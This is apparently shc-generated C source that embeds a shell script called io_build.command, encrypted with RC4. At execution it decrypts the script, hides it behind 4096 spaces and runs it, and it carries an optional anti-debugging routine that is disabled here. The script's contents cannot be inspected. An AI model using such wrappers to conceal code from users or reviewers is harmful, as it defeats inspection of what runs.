#if 0
	shc Version 3.9.3a3, Generic Shell Script Compiler
	GNU GPL Version 3 Fedor Mankov <envieidoc@gmail.com>

	./shc -v -r -f io_build.command 
#endif

static  char data [] = 
#define      chk1_z	22
#define      chk1	((&data[2]))
	"\052\073\201\107\033\315\346\241\165\057\350\213\376\105\166\230"
	"\243\151\053\325\245\216\341\303\077"
#define      rlax_z	1
#define      rlax	((&data[25]))
	"\013"
#define      msg1_z	62
#define      msg1	((&data[26]))
	"\075\010\214\342\114\176\211\266\274\060\030\353\132\250\217\004"
	"\045\077\265\013\325\033\342\056\234\117\053\263\203\116\275\111"
	"\053\122\140\204\007\131\100\156\003\337\032\130\343\172\257\263"
	"\370\060\347\076\076\304\056\204\170\004\305\164\265\224\272\112"
	"\064\060\146\364\102\160\234\031\261\227\305\122\105"
#define      opts_z	1
#define      opts	((&data[103]))
	"\323"
#define      xecc_z	15
#define      xecc	((&data[107]))
	"\344\173\126\115\237\345\155\302\041\273\163\376\332\272\253\126"
	"\127\136\131\312\350"
#define      tst1_z	22
#define      tst1	((&data[130]))
	"\340\025\076\175\307\254\306\216\100\043\215\206\206\301\175\032"
	"\074\144\004\372\056\245\076\174\006\247\206\305"
#define      date_z	1
#define      date	((&data[153]))
	"\300"
#define      lsto_z	1
#define      lsto	((&data[154]))
	"\262"
#define      shll_z	10
#define      shll	((&data[156]))
	"\262\313\116\241\005\051\050\010\131\317\255\336"
#define      text_z	533
#define      text	((&data[170]))
	"\100\001\177\027\131\314\272\227\010\355\207\212\344\035\120\001"
	"\324\242\073\045\175\032\032\116\157\160\347\357\130\005\115\302"
	"\010\300\306\111\204\313\115\041\023\306\153\265\013\342\375\174"
	"\210\105\322\255\113\153\304\127\265\067\160\032\261\076\201\377"
	"\177\160\215\267\212\005\324\111\324\032\202\012\067\167\232\340"
	"\200\312\316\036\217\047\326\353\336\343\145\060\263\352\232\074"
	"\037\132\106\276\131\127\017\130\366\325\031\326\136\303\376\007"
	"\207\115\037\246\367\223\061\063\103\006\074\114\160\222\215\173"
	"\374\141\132\357\213\347\037\146\022\032\040\265\274\345\156\122"
	"\245\123\337\032\032\153\130\041\351\175\323\313\040\270\120\103"
	"\255\333\064\372\304\033\136\226\361\325\264\250\017\372\030\252"
	"\276\240\315\031\352\311\026\263\271\161\033\163\306\104\012\265"
	"\065\246\307\355\332\075\320\301\267\207\210\227\337\370\173\152"
	"\016\234\102\113\236\174\077\121\321\324\030\314\063\057\166\055"
	"\263\363\152\243\121\155\310\032\346\110\153\127\276\243\041\172"
	"\246\265\033\120\255\241\005\161\370\160\122\041\236\302\341\055"
	"\175\010\315\132\026\261\153\247\152\073\264\023\252\302\042\324"
	"\372\053\246\014\163\112\253\275\363\305\133\313\347\145\233\243"
	"\224\322\175\203\131\250\115\066\174\025\006\174\267\065\001\207"
	"\011\013\064\322\124\211\000\132\104\124\316\067\376\162\077\355"
	"\112\035\204\025\105\317\307\325\217\047\161\142\121\115\027\254"
	"\250\212\310\254\264\072\242\005\372\230\321\070\375\226\136\114"
	"\342\307\216\220\030\116\165\064\060\041\253\024\135\041\234\363"
	"\372\142\371\316\332\047\105\100\373\232\131\006\201\056\131\074"
	"\067\344\024\175\334\042\011\324\356\101\300\234\007\114\372\324"
	"\133\043\232\073\150\255\006\376\362\100\374\211\157\141\377\202"
	"\041\201\153\370\016\221\003\140\104\323\017\206\021\315\122\271"
	"\112\373\253\052\321\173\335\202\204\330\326\304\224\170\374\052"
	"\272\070\332\361\143\031\370\170\323\103\347\266\101\254\153\150"
	"\065\161\020\023\154\013\246\137\167\172\111\261\301\302\015\117"
	"\344\270\111\022\063\254\247\222\010\075\212\305\216\334\256\146"
	"\206\025\213\235\130\035\303\204\124\152\347\024\202\027\116\341"
	"\000\130\241\247\344\304\033\016\173\237\157\203\122\352\055\220"
	"\272\361\150\067\044\211\054\254\032\341\167\233\152\066\053\034"
	"\113\264\075\360\245\324\035\372\304\056\244\201\315\256\377\206"
	"\343\265\341\357\107\313\102\141\040\303\053\230\312\142\266\223"
	"\254\063\133\344\067\317\236\057\302\042\307\173\321\166\157\045"
	"\051\151\166\035\250\211\145\063\214\006\305\135\350\032\023\167"
	"\140\274\041\320\062\267\331\135\301\227\174\346\046\017\346\044"
	"\027\255\253\133\153\207\052\100\112\265\366\231\136\231\200"
#define      pswd_z	256
#define      pswd	((&data[821]))
	"\225\204\214\253\327\032\072\111\301\275\272\164\311\275\112\334"
	"\352\233\304\305\337\143\276\301\237\000\277\002\347\014\266\245"
	"\024\066\325\304\315\254\041\010\062\317\232\160\055\174\070\067"
	"\337\057\062\152\057\110\065\052\066\163\374\204\010\110\051\020"
	"\363\154\106\204\012\004\260\224\340\207\033\210\041\375\306\054"
	"\043\070\051\167\063\343\307\004\243\147\033\211\010\325\121\066"
	"\005\144\276\135\224\211\227\012\377\226\253\133\321\122\210\326"
	"\175\110\352\241\350\231\024\106\357\000\113\226\041\036\265\251"
	"\214\127\122\134\366\211\326\114\026\166\120\134\342\370\137\223"
	"\230\166\246\341\200\323\074\074\074\063\215\315\173\206\012\173"
	"\107\125\372\143\251\066\144\323\355\355\141\066\027\037\011\366"
	"\076\007\114\047\265\070\012\234\105\365\337\250\237\153\370\244"
	"\333\031\034\377\214\322\215\071\333\322\324\372\355\315\015\346"
	"\113\044\066\010\266\067\051\251\105\021\376\326\070\007\242\034"
	"\324\250\362\030\343\242\004\230\327\066\137\316\146\222\275\200"
	"\024\366\266\246\303\373\271\376\360\244\006\043\330\122\320\034"
	"\032\300\365\244\307\164\027\233\170\206\236\264\225\344\200\370"
	"\140\147\121\366\313\355\357\107\223\113\331\041\162\237\017\043"
	"\142\344\112\277\172\243\016\142\214\166\224\113\332\332\074\064"
	"\252\376\364\214\162\030\167\221\241\072\204\036\350\266\104"
#define      tst2_z	19
#define      tst2	((&data[1127]))
	"\300\141\274\377\310\077\314\135\260\021\252\254\053\210\305\237"
	"\321\120\014\264\031\027\350"
#define      inlo_z	3
#define      inlo	((&data[1148]))
	"\015\355\140"
#define      msg2_z	19
#define      msg2	((&data[1153]))
	"\250\301\141\271\155\032\317\340\373\273\232\356\015\225\165\241"
	"\173\163\222\321\156\061\141"
#define      chk2_z	19
#define      chk2	((&data[1175]))
	"\066\272\207\311\166\214\135\005\107\210\064\230\072\154\334\114"
	"\175\340\225\200\371\143"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = getenv("_");
	if (me == NULL) { me = argv[0]; }

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
